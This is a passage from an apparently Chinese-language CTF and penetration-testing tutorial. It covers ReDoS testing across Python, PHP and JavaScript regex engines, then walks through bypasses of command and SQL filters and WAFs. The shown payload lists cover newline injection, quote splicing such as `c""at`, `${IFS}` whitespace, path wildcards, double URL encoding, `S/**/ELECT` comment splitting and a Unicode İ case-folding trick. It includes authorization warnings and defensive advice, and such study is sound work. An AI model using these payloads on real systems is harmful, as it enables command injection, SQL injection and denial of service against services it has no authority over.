预期结果：长度只加几个字符，耗时却指数级暴涨（毫秒 → 秒 → 分钟）。对目标打同样的输入，观察响应时间显著拉长或请求挂死。

> [!danger] 对目标打 ReDoS 属于 DoS，先确认授权范围；验证时用短输入（如 20~30 字符）确认耗时趋势即可，不要真的把目标打挂。

#### 第 3 步：不同引擎的差异与防御识别
- Python `re`：有回溯步数/递归深度限制（会抛 `RecursionError` 或报错），但无超时，慢就是慢。
- PHP PCRE2：受 `pcre.backtrack_limit`（默认 100 万）约束，超限直接返回 false/报错，天然免疫大部分 ReDoS。
- JavaScript：正则无步数限制，最容易被 ReDoS 打爆——Node 的 `RegExp` 是重灾区。
预期结果：同一 payload 在不同引擎上表现完全不同；JS 服务最容易挂，PHP 常常打不动。识别引擎后选对目标。
防御写法（出题方视角/加固建议）：原子组 `(?>...)` 消除回溯、非贪婪 + 锚定、限制输入长度、外包超时。

#### 第 4 步：黑名单绕过——换行、拼接与空白
命令执行被字符级过滤拦了关键词/符号时，逐类绕过：
```txt
# 换行/回车替代分号、空格
;%0aid          %0d            id%0a
# 命令拼接换词（引号/反斜杠插进关键词）
c"at"           c''at          c\at
{cat,flag}      c""at
# 空白替代
${IFS}          $IFS$9         %09
`id`            $(id)
# 路径通配
cat /fl*        cat fla[g]     ca? flag
/???/???        /bin/c?t /fl??
```
预期结果：`cat /fl*` 在 `cat /flag` 被拦时能命中；`c""at` 让「包含 `cat` 子串」的过滤失效但 shell 拼接后仍是 `cat`。
如果不行：先确认过滤是「子串匹配」还是「命令白名单」——子串匹配用拼接/编码绕，白名单就得找可利用的合法命令（`more`、`less`、`find -exec`、`grep`、`xxd`）。

#### 第 5 步：编码绕过
```txt
%252f（二次 URL 编码）    \x2f（16 进制）     \057（8 进制）
%u002f（部分解析器）      \\ 反斜杠（Windows 后端）
S%45LECT（URL 编码字母）  S/**/ELECT（SQL 注释拆词）
```
预期结果：WAF 解一层后看到的 `%252f` 还是 `%2f`，不命中规则；后端再解一层变成 `/`，实际路径/命令恢复原义。SQL 里 `S/**/ELECT` 拆开关键词，注释被数据库吃掉后仍是 `SELECT`。

#### 第 6 步：Unicode 大小写折叠差异（strtolower 与 İ）
不同语言的「转小写」行为不一致，制造出「WAF 看不见、后端当同一词」的经典错位：
- PHP `strtolower()` 只处理 ASCII：`strtolower('İ')` 结果仍是 `İ`（U+0130，带点大写 I）。
- JS `toLowerCase()` 把 `İ`(U+0130) 折叠成 `i̇`（小写 i + 组合点 U+0307）。
- MySQL `utf8_general_ci` 等宽松排序规则把 `İ` 与 `i` 视为相等。

利用模型：
```txt
WAF 规则：if (strpos(strtolower($input), 'select') !== false) 拦截
提交：   SeLİECT * FROM users
WAF 侧： strtolower 不处理 İ → 字符串不含 'select' → 放行
后端：   MySQL general_ci 把 İ 当 i → SQL 解析成 SELECT → 执行成功
```
预期结果：WAF 放行、数据库执行——「折叠差异」成立。验证方法是本地分别跑 PHP 的 `strtolower`、Node 的 `toLowerCase` 和目标数据库的排序规则，确认目标确实按 `İ==i` 比较。

> [!warn] 折叠差异强依赖具体语言/数据库/排序规则版本（PHP 的 strtolower、JS 的 toLowerCase、MySQL 的 utf8_general_ci/utf8mb4_general_ci 各不相同），命中与否必须现场验证，不能想当然。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| ReDoS payload 对目标无效 | 引擎有限制（PHP backtrack_limit / Python 步数限制） | 确认引擎；JS 服务最容易，PHP 常打不动 |
| ReDoS 把请求打挂了但无输出 | 目标进程阻塞 | 用短输入先测耗时趋势，别一上来打满 |
| `c""at` 绕不过 | 过滤做了命令白名单而非子串匹配 | 换 `find`/`more`/`xxd` 等合法命令组合 |
| `%252f` 在后端 404 | 后端只解一层，`%2f` 字面不算分隔符 | 需要两层解码的架构，否则换别的变体 |
| `İ` 折叠绕过无效 | 后端排序规则/语言不把 İ 当 i | 现场验证折叠行为，换其他 Unicode 同形字（如全角、凯撒符） |

#### 实战要点
- ReDoS 先本地计时验证趋势（长度 +N 耗时指数涨），再对目标用短输入确认，避免真 DoS 越界。
- 嵌套量词 `(X+)+`、`(X|XX)*`、`(\w+\s?)+` 是 ReDoS 识别口诀，看到就测。
- 黑名单绕过按「换行 → 拼接 → 空白 → 通配 → 编码 → 大小写折叠」的顺序逐层升级，每层都要现场验证。
- 拼接类（`c""at`）绕的是子串匹配；通配类（`/fl*`）绕的是精确匹配；编码类绕的是解码层数——先搞清楚过滤类型再选手法。
- 大小写折叠是最隐蔽的一类：WAF 与后端用的语言/排序规则不同，`İ` 这类字符就成了天然的分歧点，但必须确认目标后端确实按 `İ==i` 比较。
- 所有绕过手法都要「最小化验证」：先用 `id`/`whoami` 这类无害命令确认手法生效，再上真正的目标操作。